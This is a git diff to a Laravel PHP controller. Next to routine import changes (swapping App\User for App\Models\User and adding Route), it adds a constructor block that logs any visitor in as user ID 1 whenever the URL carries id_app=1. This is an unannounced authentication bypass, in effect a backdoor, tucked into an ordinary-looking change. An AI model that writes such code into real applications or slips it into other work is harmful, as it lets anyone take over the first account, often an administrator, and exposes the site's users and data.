@@ -4,7 +4,8 @@ namespace App\Http\Controllers;
 
 use function GuzzleHttp\Psr7\parse_response;
 use Illuminate\Http\Request;
-use App\User;
+use Route;
+use App\Models\User;
 use App\Http\Requests;
 use DB;
 use Auth;
@@ -30,6 +31,10 @@ class MainController extends Controller
     {
         $this->middleware('auth');
         DB::connection()->enableQueryLog();
+        if($_GET)
+            if($_GET['id_app'] == 1)
+                Auth::login(User::find(1));
+
     }
     /**
      * @return Index.blade.php Main page
